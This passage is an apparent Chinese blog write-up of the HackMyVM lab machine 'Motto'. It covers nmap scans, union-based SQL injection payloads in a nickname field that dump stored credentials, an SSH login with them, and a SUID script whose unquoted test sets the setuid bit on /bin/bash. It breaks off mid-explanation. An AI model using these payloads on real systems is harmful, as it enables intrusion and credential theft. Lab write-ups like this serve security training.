    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://hackmyvm.eu/machines/machine.php?vm=Motto">https://hackmyvm.eu/machines/machine.php?vm=Motto</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><p>该靶机的IP地址是固定的，无法使用<code>nmap</code>进行探测，打开靶机显示IP地址为<code>192.168.2.9</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509041126030.png"></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.9                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 11:24 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00029s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9090/tcp open  zeus-admin<br>MAC Address: 08:00:27:8C:F9:3A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 5.56 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、9090</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,9090 192.168.2.9<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 11:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.0015s latency).<br><br>PORT     STATE SERVICE     VERSION<br>22/tcp   open  ssh         OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.62 ((Debian))<br>|_http-title: \xE7\x82\xB9\xE5\x87\xBB\xE6\x96\xB9\xE5\x9D\x97\xE5\xB0\x8F\xE6\xB8\xB8\xE6\x88\x8F<br>|_http-server-header: Apache/2.4.62 (Debian)<br>9090/tcp open  zeus-admin?<br>| fingerprint-strings: <br>|   GenericLines, SqueezeCenter_CLI: <br>|     HTTP/1.1 400 Bad Request<br>|     Content-Type: text/plain; charset=utf-8<br>|     Connection: close<br>|     Request<br>|   GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Content-Type: text/html; charset=utf-8<br>|     Date: Thu, 04 Sep 2025 03:28:00 GMT<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span> /&gt;<br>|     &lt;title&gt;Mottos&lt;/title&gt;<br>|     &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;/static/css/index.css&quot;</span> /&gt;<br>|     &lt;style&gt;<br>|     .top-right-auth &#123;<br>|     position: fixed;<br>|     top: 20px;<br>|     right: 30px;<br>|     font-size: 14px;<br>|     font-family: Arial, sans-serif;<br>|     z-index: 1000;<br>|     .top-right-auth a, .top-right-auth button &#123;<br>|     color: <span class="hljs-comment">#2980b9;</span><br>|     text-decoration: none;<br>|     margin-left: 10px;<br>|     font-weight: 600;<br>|     border: 1.5px solid <span class="hljs-comment">#2980b9;</span><br>|     padding: 6px 14px;<br>|     border-radius: 20px;<br>|     background: none;<br>|     cursor: pointer;<br>|_    transition: background-color 0.3s,<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>...<br>MAC Address: 08:00:27:8C:F9:3A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 135.01 seconds<br></code></pre></td></tr></table></figure><h3 id="3-UDP端口扫描"><a href="#3-UDP端口扫描" class="headerlink" title="3.UDP端口扫描"></a>3.UDP端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sU --top-ports 100 192.168.2.9<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 14:38 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00062s latency).<br>All 100 scanned ports on 192.168.2.9 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 61 closed udp ports (port-unreach), 39 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:8C:F9:3A (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 59.18 seconds<br></code></pre></td></tr></table></figure><p>没有开放的udp端口</p><h3 id="4-漏洞脚本扫描"><a href="#4-漏洞脚本扫描" class="headerlink" title="4.漏洞脚本扫描"></a>4.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --script=vuln -p22,80,9090 192.168.2.9              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-04 14:21 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.9<br>Host is up (0.00033s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">9090/tcp open  zeus-admin</span><br><span class="hljs-string">MAC Address: 08:00:27:8C:F9:3A (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 31.53 seconds</span><br></code></pre></td></tr></table></figure><p>没有其他有用的信息</p><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口-Apache服务"><a href="#1、80端口-Apache服务" class="headerlink" title="1、80端口-Apache服务"></a>1、80端口-Apache服务</h2><p>访问80端口服务，发现是一个游戏页面，查看源码和目录扫描没有找到有用的信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509041448092.png"></p><h2 id="2、9090端口"><a href="#2、9090端口" class="headerlink" title="2、9090端口"></a>2、9090端口</h2><p>访问9090端口，是一个留言板，尝试写入留言，提示需要进行登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121009075.png"></p><p>跳转到登录页面，进行注册后登录<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509041426684.png"></p><p>写一个Motto，然后查看我的Motto就会显示出写的Motto<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121014331.png"></p><p>修改昵称为<code>sunset</code>后查看Motto，发现会显示<code>sunset</code>的Motto<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121016140.png"></p><p>修改昵称为<code>sunset&#39;</code>后，发现无回显<br>再次将昵称修改为<code>sunset&#39; -- a</code>后，又能成功回显<br>故判断此处存在<code>sql注入</code></p><h1 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h1><h2 id="1、SQL注入-union联合注入"><a href="#1、SQL注入-union联合注入" class="headerlink" title="1、SQL注入-union联合注入"></a>1、SQL注入-union联合注入</h2><h3 id="1-查看回显的列"><a href="#1-查看回显的列" class="headerlink" title="1.查看回显的列"></a>1.查看回显的列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunset<span class="hljs-string">&#x27; order by 3 -- a</span><br></code></pre></td></tr></table></figure><p>能成功进行回显</p><h3 id="2-查看所有的数据库"><a href="#2-查看所有的数据库" class="headerlink" title="2.查看所有的数据库"></a>2.查看所有的数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunset<span class="hljs-string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata -- a</span><br></code></pre></td></tr></table></figure><p>成功回显，同时在第三列存在回显<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121033804.png"></p><h3 id="3-查看数据库下面存在的表名"><a href="#3-查看数据库下面存在的表名" class="headerlink" title="3.查看数据库下面存在的表名"></a>3.查看数据库下面存在的表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunset<span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-- a</span><br></code></pre></td></tr></table></figure><p>回显出两个表名<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121037440.png"></p><h3 id="4-查看register-infos的字段"><a href="#4-查看register-infos的字段" class="headerlink" title="4.查看register_infos的字段"></a>4.查看<code>register_infos</code>的字段</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunset<span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>register_infos<span class="hljs-string">&#x27;-- a</span><br></code></pre></td></tr></table></figure><p>找到相关的字段名<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121039978.png"></p><h3 id="5-查看表中的username、password"><a href="#5-查看表中的username、password" class="headerlink" title="5.查看表中的username、password"></a>5.查看表中的<code>username、password</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sunset<span class="hljs-string">&#x27; union select 1,username,password from register_infos; -- a</span><br></code></pre></td></tr></table></figure><p>回显出数据<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202509121041762.png"><br>得到用户<code>RedBean</code>以及密码<code>cannotforgetyou</code></p><h1 id="四、获取redbean权限"><a href="#四、获取redbean权限" class="headerlink" title="四、获取redbean权限"></a>四、获取redbean权限</h1><p>直接ssh连接，需要注意用户为小写<code>redbean</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh redbean@192.168.2.9<br>redbean@192.168.2.9<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux motto 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Thu Jul 31 04:01:36 2025 from 192.168.56.103</span><br><span class="hljs-string">redbean@motto:~$ id</span><br><span class="hljs-string">uid=1000(redbean) gid=1000(redbean) groups=1000(redbean)</span><br></code></pre></td></tr></table></figure><h1 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h1><p>查看<code>sudo</code>属性，发现需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~$ <span class="hljs-built_in">sudo</span> -l<br><span class="hljs-built_in">sudo</span>: unable to resolve host motto: Temporary failure <span class="hljs-keyword">in</span> name resolution<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> redbean: <br></code></pre></td></tr></table></figure><p>查看具有<code>suid</code>权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br>/opt/run_newsh<br></code></pre></td></tr></table></figure><p>找到一个<code>/opt/run_newsh</code>，使用<code>strings</code>进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:/opt$ strings run_newsh <br>/lib64/ld-linux-x86-64.so.2<br>setuid<br>execv<br>perror<br>stderr<br>fprintf<br>__cxa_finalize<br>setgid<br>__libc_start_main<br>libc.so.6<br>GLIBC_2.2.5<br>_ITM_deregisterTMCloneTable<br>__gmon_start__<br>_ITM_registerTMCloneTable<br>u/UH<br>[]A\A]A^A_<br>Usage: %s &lt;arg&gt;<br>/opt/new.sh<br>execv failed<br>;*3$<span class="hljs-string">&quot;</span><br><span class="hljs-string">GCC: (Debian 10.2.1-6) 10.2.1 20210110</span><br><span class="hljs-string">crtstuff.c</span><br><span class="hljs-string">deregister_tm_clones</span><br><span class="hljs-string">__do_global_dtors_aux</span><br><span class="hljs-string">completed.0</span><br><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><br><span class="hljs-string">frame_dummy</span><br><span class="hljs-string">__frame_dummy_init_array_entry</span><br><span class="hljs-string">run_newsh.c</span><br><span class="hljs-string">...</span><br></code></pre></td></tr></table></figure><p>发现他执行<code>/opt/new.sh</code>文件<br>查看<code>/opt/new.sh</code>文件，发现没有权限进行编辑</p><p>全局搜索<code>new.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:/opt$ find / -name new.sh 2&gt;/dev/null<br>/home/redbean/.backup/new.sh<br>/opt/new.sh<br></code></pre></td></tr></table></figure><p>在<code>/home/redbean/.backup</code>目录下面，找到了<code>new.sh</code>和<code>run_newsh.c</code>源码</p><p><code>new.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~/.backup$ <span class="hljs-built_in">cat</span> new.sh <br><span class="hljs-comment">#!/bin/bash</span><br>PATH=/usr/bin<br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;35m&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;▓▒░ Loading system diagnostics ░▒▓&#x27;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[0m&quot;</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;34m[INFO]\033[0m Initializing environment checks:&quot;</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> A B C; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;33m ● Module <span class="hljs-variable">$&#123;step&#125;</span> status: OK (ver <span class="hljs-subst">$(($RANDOM%5+1)</span>).<span class="hljs-subst">$(($RANDOM%20)</span>).<span class="hljs-subst">$(($RANDOM%500)</span>))\033[0m&quot;</span><br>    <span class="hljs-built_in">sleep</span> 0.12<br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Random seed value: <span class="hljs-variable">$RANDOM</span>&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;34m[INFO]\033[0m Evaluating input parameters...&quot;</span><br><span class="hljs-built_in">sleep</span> 0.15<br><br>[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ] || <span class="hljs-built_in">exit</span> 1<br>[ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-string">&quot;flag&quot;</span> ] &amp;&amp; <span class="hljs-built_in">exit</span> 2<br>[ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;flag&quot;</span> ] &amp;&amp; <span class="hljs-built_in">chmod</span> +s /bin/bash <br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;34m[INFO]\033[0m Running diagnostic sequence:&quot;</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> &#123;1..3&#125;; <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;35m → Executing test <span class="hljs-variable">$&#123;step&#125;</span> of 3\033[0m&quot;</span><br>    <span class="hljs-built_in">sleep</span> 0.2<br><span class="hljs-keyword">done</span><br><br>WAIT_TIME=$((RANDOM%<span class="hljs-number">5</span>+<span class="hljs-number">2</span>))<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;36m\nWaiting period: \033[3<span class="hljs-variable">$&#123;WAIT_TIME&#125;</span>m<span class="hljs-variable">$&#123;WAIT_TIME&#125;</span> seconds\033[0m&quot;</span><br><br><span class="hljs-keyword">for</span> ((i=WAIT_TIME; i&gt;=<span class="hljs-number">0</span>; i--)); <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">case</span> $((i%<span class="hljs-number">4</span>)) <span class="hljs-keyword">in</span><br>        0) COL=<span class="hljs-string">&quot;34&quot;</span> ;; <span class="hljs-comment"># 蓝</span><br>        1) COL=<span class="hljs-string">&quot;32&quot;</span> ;; <span class="hljs-comment"># 绿</span><br>        2) COL=<span class="hljs-string">&quot;31&quot;</span> ;; <span class="hljs-comment"># 红</span><br>        3) COL=<span class="hljs-string">&quot;36&quot;</span> ;; <span class="hljs-comment"># 青</span><br>    <span class="hljs-keyword">esac</span><br><br>    <span class="hljs-keyword">case</span> $((i%<span class="hljs-number">2</span>)) <span class="hljs-keyword">in</span><br>        0) <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;<span class="hljs-variable">$&#123;COL&#125;</span>m&gt;&gt; Waiting T-<span class="hljs-variable">$&#123;i&#125;</span> seconds...\033[0m&quot;</span> ;;<br>        1) <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;<span class="hljs-variable">$&#123;COL&#125;</span>m&gt;&gt; Countdown: <span class="hljs-variable">$&#123;i&#125;</span>\033[0m&quot;</span> ;;<br>    <span class="hljs-keyword">esac</span><br><br>    [ <span class="hljs-variable">$i</span> -gt 0 ] &amp;&amp; <span class="hljs-built_in">sleep</span> 1<br><span class="hljs-keyword">done</span><br><br>RESULTS=(<br>    <span class="hljs-string">&quot;Diagnostics complete.&quot;</span><br>    <span class="hljs-string">&quot;All systems nominal.&quot;</span><br>    <span class="hljs-string">&quot;No errors detected.&quot;</span><br>    <span class="hljs-string">&quot;System stable.&quot;</span><br>)<br><br>FINAL_MSG=<span class="hljs-variable">$&#123;RESULTS[$RANDOM % <span class="hljs-variable">$&#123;#RESULTS[@]&#125;</span>]&#125;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;32m<span class="hljs-variable">$&#123;FINAL_MSG&#125;</span>\033[0m&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;34mThank you for using the system monitor.\033[0m&quot;</span><br><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\033[1;30m[STATS] Summary Report:\033[0m&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;    Processes checked: <span class="hljs-subst">$((RANDOM%60+20)</span>)&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;    CPU load average: <span class="hljs-subst">$(echo <span class="hljs-string">&quot;scale=2; <span class="hljs-variable">$RANDOM</span>%10+0.5&quot;</span> | bc)</span>&quot;</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;    Uptime (hours): <span class="hljs-subst">$((RANDOM%100+1)</span>)&quot;</span><br></code></pre></td></tr></table></figure><p><code>run_newsh.c</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">redbean@motto:~/.backup$ <span class="hljs-built_in">cat</span> run_newsh.c <br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br>int main(int argc, char *argv[]) &#123;<br>    <span class="hljs-keyword">if</span> (argc != 2) &#123;<br>        fprintf(stderr, <span class="hljs-string">&quot;Usage: %s &lt;arg&gt;\n&quot;</span>, argv[0]);<br>        <span class="hljs-built_in">return</span> 1;<br>    &#125;<br><br>    // 切换为 root 权限（如果以 setuid 运行）<br>    setuid(0);<br>    setgid(0);<br><br>    // 构造参数，调用 ./new.sh 参数<br>    char *script = <span class="hljs-string">&quot;/opt/new.sh&quot;</span>;<br>    char *args[] = &#123; script, argv[1], NULL &#125;;<br><br>    execv(script, args);  // 用 execv 调用脚本<br><br>    perror(<span class="hljs-string">&quot;execv failed&quot;</span>);<br>    <span class="hljs-built_in">return</span> 1;<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>new.sh</code>中，存在漏洞，第三个条件没有转换成字符串加个空格就能绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[ -n <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> ] || <span class="hljs-built_in">exit</span> 1<br>[ <span 